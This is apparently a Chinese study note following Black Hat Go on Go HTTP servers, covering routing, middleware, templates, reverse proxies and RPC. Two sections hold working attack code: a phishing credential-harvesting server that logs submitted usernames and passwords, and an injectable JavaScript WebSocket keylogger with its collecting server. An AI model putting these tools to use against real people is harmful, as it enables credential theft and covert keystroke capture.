---
created: '21/06/06 08:55'
title: golang-sec-note
tags:
  - golang
---

# 第四章-HTTP服务器

### 一个简单的http服务器

 ```Go
 package main
 
 import (
   "fmt"
   "net/http"
 )
 
 func hello(w http.ResponseWriter, r *http.Request) {
   name := r.URL.Query().Get("name")
   fmt.Fprintf(w, "Hello, %s\n", name)
 }
 
 func main() {
   http.HandleFunc("/hello", hello)
   http.ListenAndServe(":8000", nil)
 }
 
 ```


### 使用动态路由的服务器

 ```Go
 package main
 
 import (
   "fmt"
   "net/http"
   "strings"
 )
 
 type router struct {
 }
 
 func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
   urlpath := req.URL.Path
   if strings.HasPrefix(urlpath, "/a") {
     fmt.Fprint(w, "hello a")
   } else if strings.HasPrefix(urlpath, "/b") {
     fmt.Fprint(w, "hello b")
   } else if strings.HasPrefix(urlpath, "/c") {
     fmt.Fprint(w, "hello c")
   } else {
     http.Error(w, "404 not found", 404)
   }
 }
 
 func main() {
   http.ListenAndServe(":8000", &router{})
 }
 
 ```


### 一个简单的中间件

 ```Go
 package main
 
 import (
   "fmt"
   "log"
   "net/http"
 )
 
 type logger struct {
   Inner http.Handler
 }
 
 func (l *logger) ServeHTTP(w http.ResponseWriter, r *http.Request) {
   log.Print("start")
   l.Inner.ServeHTTP(w, r)
   log.Print("end")
 }
 
 func hello(w http.ResponseWriter, r *http.Request) {
   fmt.Fprint(w, "hello\n")
 }
 
 func main() {
   f := http.HandlerFunc(hello)
   http.ListenAndServe(":8000", &logger{Inner: f})
 }
 
 ```


这里实现了一种类似于装饰器的思想.

首先http.HandlerFunc的定义和方法如下,可以看到HandlerFunc即`func(ResponseWriter, *Request)`的别名,当调用ServeHTTP函数的时候会回调调用该函数本身,从而调用我们例子中的hello函数

 ```Go
 // The HandlerFunc type is an adapter to allow the use of
 // ordinary functions as HTTP handlers. If f is a function
 // with the appropriate signature, HandlerFunc(f) is a
 // Handler that calls f.
 type HandlerFunc func(ResponseWriter, *Request)
 
 // ServeHTTP calls f(w, r).
 func (f HandlerFunc) ServeHTTP(w ResponseWriter, r *Request) {
   f(w, r)
 }
 ```


然后我们定义了一个自己的结构体logger,包含了一个Inner属性,类型为http.Handler,而http.Handler的定义如下

 ```Go
 type Handler interface {
   ServeHTTP(ResponseWriter, *Request)
 }
 ```


可以看到是一个接口,只需要实现了ServeHTTP这个方法即可,那么我们的HandlerFunc就能充当Handler

最后我们定义了logger的ServeHTTP,执行某些语句,回调hello这个函数的ServeHTTP,最后再执行某些语句,实现了类似于装饰器的结构

调用链为:`ListenAndServe使用logger作为路由->logger.ServeHTTP->hello.ServeHTTP->hello`

### [第三方包:alice](https://github.com/justinas/alice)

*Alice提供了一种便捷的方式来链接您的HTTP中间件功能和应用程序处理程序。*

如果使用Alice来改写上面的中间件的话,代码会变成

 ```Go
 package main
 
 import (
   "fmt"
   "log"
   "net/http"
   "time"
 
   "github.com/justinas/alice"
 )
 
 func logHandler(h http.Handler) http.Handler {
   return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
     log.Print("start")
     h.ServeHTTP(w, r)
     log.Print("end")
   })
 }
 
 func timeoutHandler(h http.Handler) http.Handler {
   return http.TimeoutHandler(h, 1*time.Second, "timed out")
 }
 
 func hello(w http.ResponseWriter, r *http.Request) {
   fmt.Fprint(w, "hello\n")
 }
 
 func main() {
   middleWare := alice.New(logHandler, timeoutHandler)
   http.ListenAndServe(":8000", middleWare.Then(http.HandlerFunc(hello)))
 }
 
 ```


可以看到alice包的作用很简单,帮助我们拼接中间件,在经过中间件过后再执行我们的Handler

### [第三方包:mux](https://github.com/gorilla/mux)

结合了alice和mux的一个简单测试服务器如下

 ```Go
 package main
 
 import (
   "fmt"
   "log"
   "net/http"
   "time"
 
   "github.com/gorilla/mux"
   "github.com/justinas/alice"
 )
 
 func logHandler(h http.Handler) http.Handler {
   return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
     log.Print("start")
     h.ServeHTTP(w, r)
     log.Print("end")
   })
 }
 
 func timeoutHandler(h http.Handler) http.Handler {
   return http.TimeoutHandler(h, 1*time.Second, "timed out")
 }
 
 func hello(w http.ResponseWriter, r *http.Request) {
   value, ok := mux.Vars(r)["value"]
   w.WriteHeader(http.StatusOK)
   if ok {
     r.ParseForm()
     key := r.Form.Get("key")
     fmt.Fprintf(w, "key is %s, value is %s\n", key, value)
   } else {
     fmt.Fprintf(w, "hello")
   }
 }
 
 func main() {
   middleWare := alice.New(logHandler, timeoutHandler)
   r := mux.NewRouter()
   s := r.PathPrefix("/hello").Subrouter()
      s.HandleFunc("", hello).Methods("GET")
      s.HandleFunc("/", hello).Methods("GET")
   s.HandleFunc("/{value}", hello).Methods("POST")
   http.ListenAndServe(":8000", middleWare.Then(r))
 }
 ```


### 第三方包:[Martini](https://github.com/go-martini/martini)

*Martini更像是集成了前面所有的包的第三方包,不使用原生的net/http包*

具体使用查看[这里](https://github.com/go-martini/martini/blob/master/translations/README_zh_cn.md),值得一提的是可以在[这里](https://github.com/martini-contrib)找到这个第三方包的中间件

### HTML模板

golang中自带有html模板的包:`html/template`,一个简单的使用如下

 ```Go
 package main
 
 import (
   "html/template"
   "net/http"
 
   "github.com/go-martini/martini"
 )
 
 type TemplateData struct {
   UserName string
   Password string
 }
 
 var x = `<html>
  <body>
    Hello {{.UserName}}. Your password is {{.Password}}.
  </body>
 </html>`
 
 func main() {
   m := martini.Classic()
   m.Get("/", func() string {
     return "Hello world!"
   })
   m.Get("/hello/:UserName/:Password", func(params martini.Params, w http.ResponseWriter) {
     t, err := template.New("hello").Parse(x)
     if err != nil {
       w.WriteHeader(500)
     }
     td := TemplateData{UserName: params["UserName"], Password: params["Password"]}
     t.Execute(w, td)
   })
   m.RunOnAddr(":8000")
 }
 ```


### Credential Harvesting Attack(凭证收集攻击)

实际上就是钓鱼,核心思想是创建克隆网站,欺骗用户输入它的凭证并记录

blackhat-go里给了一个[示例](https://github.com/blackhat-go/bhg/tree/master/ch-4/credential_harvester)

这里需要将下载下来的public/index.html中的表单action改为"/login"

然后使用golang构建一个简单的http服务器用于窃取凭证

 ```Go
 package main
 
 import (
   "net/http"
   "os"
   "time"
 
   "github.com/gorilla/mux"
   log "github.com/sirupsen/logrus"
 )
 
 func login(w http.ResponseWriter, r *http.Request) {
   log.WithFields(log.Fields{
     "time":       time.Now().String(),
     "username":   r.FormValue("_user"),
     "password":   r.FormValue("_pass"),
     "user-agent": r.UserAgent(),
     "ip_address": r.RemoteAddr,
   }).Info("login attempt")
   http.Redirect(w, r, "/", 302)
 }
 
 func main() {
   fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
   if err != nil {
     panic(err)
   }
   defer fh.Close()
   log.SetOutput(fh)
   r := mux.NewRouter()
   r.HandleFunc("/login", login).Methods("POST")
   r.PathPrefix("/").Handler(http.FileServer(http.Dir("./public")))
   log.Fatal(http.ListenAndServe(":8080", r))
 }
 
 ```


这里用到了http.FileServer和http.Dir,配合gorilla/mux,将public目录设置成了web根目录,函数login的作用就是将用户post的内容记录在日志中

### Keylogging With Websocket(使用Websocket的键盘记录器)

攻击场景是自己架设了一个服务器或者某个服务器上存在XSS漏洞,这时可以通过插入某段恶意JS代码,通过Websocket将用户的任何输入发送回攻击者的服务器

首先需要一个测试环境,blackhat-go推荐使用[JSBIN](http://jsbin.com)

一段测试用的HTML代码

 ```HTML
 <!DOCTYPE html>
 <html>
 <head>
  <title>Login</title>
 </head>
 <body>
  <script src='http://localhost:8080/logger.js'></script>
  <form action='/login' method='post'>
  <input name='username'/>
  <input name='password'/>
  <input type="submit"/> 
  </form>
 </body>
 </html>
 ```


一段简单的建立websocket的logger.js (Go模板)

 ```JavaScript
 (function() {
  var conn = new WebSocket("ws://{{.}}/ws");
  document.onkeypress = keypress;
  function keypress(evt) {
  s = String.fromCharCode(evt.which);
  conn.send(s);
  }
 })();
 ```


然后一个用于提供logger.js和处理websocket的服务器,这里用到了[websocket](https://github.com/gorilla/websocket)第三方包

 ```Go
 package main
 
 import (
   "flag"
   "fmt"
   "html/template"
   "log"
   "net/http"
 
   "github.com/gorilla/mux"
   "github.com/gorilla/websocket"
 )
 
 var (
   upgrader = websocket.Upgrader{
     CheckOrigin: func(r *http.Request) bool { return true },
   }
   listenAddr string
   wsAddr     string
   jsTemplate *template.Template
 )
 
 func init() {
   flag.StringVar(&listenAddr, "listen", "", "Address to listen on")
   flag.StringVar(&wsAddr, "ws", "", "Address for WebSocket connection")
   flag.Parse()
   var err error
   jsTemplate, err = template.ParseFiles("logger.js")
   if err != nil {
     panic(err)
   }
 }
 
 func serveWS(w http.ResponseWriter, r *http.Request) {
   conn, err := upgrader.Upgrade(w, r, nil)
   if err != nil {
     http.Error(w, "", 500)
     return
   }
   defer conn.Close()
   fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
   for {
     _, msg, err := conn.ReadMessage()
     if err != nil {
       return
     }
     fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
 
   }
 
 }
 
 func serveLogger(w http.ResponseWriter, r *http.Request) {
   w.Header().Set("Content-Type", "application/javascript")
   jsTemplate.Execute(w, wsAddr)
 }
 
 func main() {
   r := mux.NewRouter()
   r.HandleFunc("/ws", serveWS)
   r.HandleFunc("/logger.js", serveLogger)
   fmt.Println("test", wsAddr)
   log.Fatal(http.ListenAndServe(":8080", r))
 }
 
 ```


~~websocket还是很好玩的,实际效果如下~~
转移笔记的时候图弄丢了，各位师傅们请自己手动测试下代码吧


### Reverse Proxy(反向代理)

golang自带的httputil包中存在ReverseProxy的实现,一个简单的反向代理如下

 ```Go
 package main
 
 import (
   "log"
   "net/http"
   "net/http/httputil"
   "net/url"
 )
 
 func main() {
     // 将 http://127.0.0.1:8888/ 反向代理到 http://127.0.0.1:80/
   targetUrlString := "http://127.0.0.1:80/"
   targetUrl, err := url.Parse(targetUrlString)
   if err != nil {
     log.Fatal("err")
   }
   proxy := httputil.NewSingleHostReverseProxy(targetUrl)
   log.Println("Reverse proxy server at 127.0.0.1:8888")
   if err := http.ListenAndServe(":8888", proxy); err != nil {
     log.Fatalln("Error:", err)
   }
 }
 ```


### 简单的RPC服务器

参考文章:[Go官方库RPC开发指南](https://colobu.com/2016/09/18/go-net-rpc-guide/)

使用golang中自带的`net/rpc`包编写一个简单的rpc服务器(可以用于实现类似动态导入的功能)

首先定义一个`rpc_client.go`

 ```Go
 package rpc_server
 
 import (
   "errors"
   "log"
   "net"
   "net/http"
   "net/rpc"
 )
 
 type Args struct {  // 传入参数结构
   A, B int
 }
 
 // 返回参数结构
 type Quotient struct {
   Quo, Rem int
 }
 
 // rpc服务器要实现的接口
 type ServiceInterface interface {
   Multiply(args *Args, reply *int) error
   Divide(args *Args, quo *Quotient) error
 }
 
 // 空的结构,用于实现rpc服务器接口
 type Service struct { 
 }
 
 // 实现Multiply方法
 func (ss *Service) Multiply(args *Args, reply *int) error {  
   *reply = args.A * args.B
   return nil
 }
 
 // 实现Divide方法
 func (ss *Service) Divide(args *Args, quo *Quotient) error {
   if args.B == 0 {
     return errors.New("Divide by zero")
   }
   quo.Quo = args.A / args.B
   quo.Rem = args.A % args.B
   return nil
 }
 
 // 开始监听端口,处理连接
 func Start() {
   s := new(Service)
   rpc.Register(s)
   rpc.HandleHTTP()
 
   l, e := net.Listen("tcp", ":8888")
   if e != nil {
     log.Fatal("listen error:", e)
   }
   go http.Serve(l, nil)
 }
 
 ```


然后编写`rpc_client.go`

 ```Go
 package rpc_client
 
 import (
   "fmt"
   "learn/rpc_server"
   "log"
   "net/rpc"
 )
 
 const ServiceName = "Service"
 
 // 连接到rpc服务器并且远程调用Multiply方法
 func Connect(address string) {
   client, err := rpc.DialHTTP("tcp", address)
   if err != nil {
     log.Fatal("Dial error:", err)
   }
   args := &rpc_server.Args{A: 7, B: 8}
   var reply int
   err = client.Call(ServiceName+".Multiply", args, &reply)
   if err != nil {
     log.Fatal("Error:", err)
   }
   fmt.Printf("Multiply: %d*%d=%d", args.A, args.B, reply)
 }
 ```


最后编写一个main.go做测试

 ```Go
 package main
 
 import (
   "learn/rpc_client"
   "learn/rpc_server"
   "time"
 )
 
 func main() {
   rpc_server.Start()
   time.Sleep(1 * time.Second)
   rpc_client.Connect("127.0.0.1:8888")
 }
 ```

~~实现效果如下~~
转移笔记的时候图弄丢了，各位师傅们请自己手动测试下代码吧

**然而golang中自带的net/rpc包存在某些缺点,如:**(参考文章:[Golang标准库RPC实践及改进](http://daizuozhuo.github.io/golang-rpc-practice/))

- 当集群机器增加到一定数量,请求量变大时,会出现很多任务卡住没有响应的情况,可以转用tcp实现rpc服务器解决

- rpc包里的rpc.Dial函数没有timeout, 系统默认是没有timeout的,所以在这里可能卡住.所以我们可以采用net包里的 net.DialTimeout函数

- rpc包里默认使用gobCodec来编码解码, 这里io可能会卡住而不返回错误,所以我们要自己编写加入timeout的codec. 注意server这边读写都有timeout,但是client这边只有写有timeout,因为读的话并不能预知任务完成的时间

**可以学习下****rpcx****好像使用起来更加简单,而且features也很多**

一个简单的服务器如下

 ```Go
 package main
 
 import (
   "context"
   "flag"
   "fmt"
 
   example "github.com/rpcxio/rpcx-examples"
   "github.com/smallnest/rpcx/server"
 )
 
 var (
   addr = flag.String("addr", "localhost:8888", "server address")
 )
 
 type Arith struct{}
 
 // the second parameter is not a pointer
 func (t *Arith) Mul(ctx context.Context, args example.Args, reply *example.Reply) error {
   reply.C = args.A * args.B
   fmt.Println("C=", reply.C)
   return nil
 }
 
 func main() {
   flag.Parse()
 
   s := server.NewServer()
   //s.Register(new(Arith), "")
   s.RegisterName("Arith", new(Arith), "")
   err := s.Serve("tcp", *addr)
   if err != nil {
     panic(err)
   }
 }
 ```


一个简单的客户端如下,这里值得注意的是根据github的Readme所说,因为rpcx依赖于etcd,而etcd在go mods里使用存在问题,所以需要在go.mod中添加

 ```纯文本
 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0
 ```


 ```Go
 package main
 
 import (
   "context"
   "flag"
 
   "log"
 
   "github.com/smallnest/rpcx/protocol"
 
   example "github.com/rpcxio/rpcx-examples"
   "github.com/smallnest/rpcx/client"
 )
 
 var (
   addr = flag.String("addr", "localhost:8888", "server address")
 )
 
 func main() {
   flag.Parse()
   d := client.NewPeer2PeerDiscovery("tcp@"+*addr, "")
   opt := client.DefaultOption
   opt.SerializeType = protocol.JSON
 
   xclient := client.NewXClient("Arith", client.Failtry, client.RandomSelect, d, opt)
   defer xclient.Close()
 
   args := example.Args{
     A: 10,
     B: 20,
   }
 
   reply := &example.Reply{}
   err := xclient.Call(context.Background(), "Mul", args, reply)
   if err != nil {
     log.Fatalf("failed to call: %v", err)
   }
 
   log.Printf("%d * %d = %d", args.A, args.B, reply.C)
 
 }
 ```


可以看到接收参数和返回参数的定义都存在了`github.com/rpcxio/rpcx-examples`里,到时候要自己编写的话可以自己提前写好丢到github上

可以学习下[grpc-go](https://github.com/grpc/grpc-go)(似乎概念比较多 暂时咕了)